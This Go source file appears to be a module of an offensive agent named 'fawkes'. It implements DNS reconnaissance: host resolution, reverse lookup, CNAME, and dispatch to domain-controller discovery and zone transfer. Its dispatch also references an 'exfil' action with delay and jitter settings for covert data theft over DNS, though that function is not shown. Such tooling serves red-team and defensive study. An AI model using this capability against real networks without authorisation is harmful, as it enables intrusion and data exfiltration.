package commands

import (
	"context"
	"fmt"
	"net"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

type DnsCommand struct{}

func (c *DnsCommand) Name() string { return "dns" }
func (c *DnsCommand) Description() string {
	return "DNS enumeration — resolve hosts, query records, discover domain controllers (T1018)"
}

type dnsArgs struct {
	Action  string `json:"action"`  // resolve, reverse, srv, mx, ns, txt, cname, all, dc, zone-transfer, exfil
	Target  string `json:"target"`  // hostname, IP, or domain
	Server  string `json:"server"`  // DNS server (optional, required for zone-transfer)
	Timeout int    `json:"timeout"` // timeout in seconds (default: 5)
	Data    string `json:"data"`    // Data to exfiltrate (exfil action: file path or raw string)
	Delay   int    `json:"delay"`   // Delay between DNS queries in ms (exfil, default: 100)
	Jitter  int    `json:"jitter"`  // Random jitter 0-N ms added to delay (exfil, default: 50)
}

func (c *DnsCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[dnsArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Target == "" && args.Action != "exfil" {
		return errorResult("Error: target is required")
	}

	if args.Action == "" {
		return errorResult("Error: action required. Valid: resolve, reverse, srv, mx, ns, txt, cname, all, dc, zone-transfer, wildcard, exfil")
	}

	if args.Timeout <= 0 {
		args.Timeout = 5
	}

	resolver := &net.Resolver{}
	if args.Server != "" {
		resolver = &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{Timeout: time.Duration(args.Timeout) * time.Second}
				server := args.Server
				if !strings.Contains(server, ":") {
					server += ":53"
				}
				return d.DialContext(ctx, "udp", server)
			},
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(args.Timeout)*time.Second)
	defer cancel()

	switch args.Action {
	case "resolve":
		return dnsResolve(ctx, resolver, args)
	case "reverse":
		return dnsReverse(ctx, resolver, args)
	case "srv":
		return dnsSRV(ctx, resolver, args)
	case "mx":
		return dnsMX(ctx, resolver, args)
	case "ns":
		return dnsNS(ctx, resolver, args)
	case "txt":
		return dnsTXT(ctx, resolver, args)
	case "cname":
		return dnsCNAME(ctx, resolver, args)
	case "all":
		return dnsAll(ctx, resolver, args)
	case "dc":
		return dnsDC(ctx, resolver, args)
	case "zone-transfer", "axfr":
		return dnsAXFR(ctx, args)
	case "wildcard":
		return dnsWildcard(ctx, resolver, args)
	case "exfil":
		return dnsExfil(args)
	default:
		return errorf("Error: unknown action %q. Valid: resolve, reverse, srv, mx, ns, txt, cname, all, dc, zone-transfer, wildcard, exfil", args.Action)
	}
}

func dnsResolve(ctx context.Context, r *net.Resolver, args dnsArgs) structs.CommandResult {
	addrs, err := r.LookupHost(ctx, args.Target)
	if err != nil {
		return errorf("Error resolving %s: %v", args.Target, err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] A/AAAA records for %s (%d found)\n", args.Target, len(addrs)))
	for _, addr := range addrs {
		sb.WriteString(fmt.Sprintf("  %s\n", addr))
	}

	return successResult(sb.String())
}

func dnsReverse(ctx context.Context, r *net.Resolver, args dnsArgs) structs.CommandResult {
	names, err := r.LookupAddr(ctx, args.Target)
	if err != nil {
		return errorf("Error reverse lookup %s: %v", args.Target, err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] PTR records for %s (%d found)\n", args.Target, len(names)))
	for _, name := range names {
		sb.WriteString(fmt.Sprintf("  %s\n", name))
	}

	return successResult(sb.String())
}

func dnsCNAME(ctx context.Context, r *net.Resolver, args dnsArgs) structs.CommandResult {
	cname, err := r.LookupCNAME(ctx, args.Target)
	if err != nil {
		return errorf("Error CNAME lookup %s: %v", args.Target, err)
	}

	return successf("[*] CNAME for %s\n  %s\n", args.Target, cname)
}
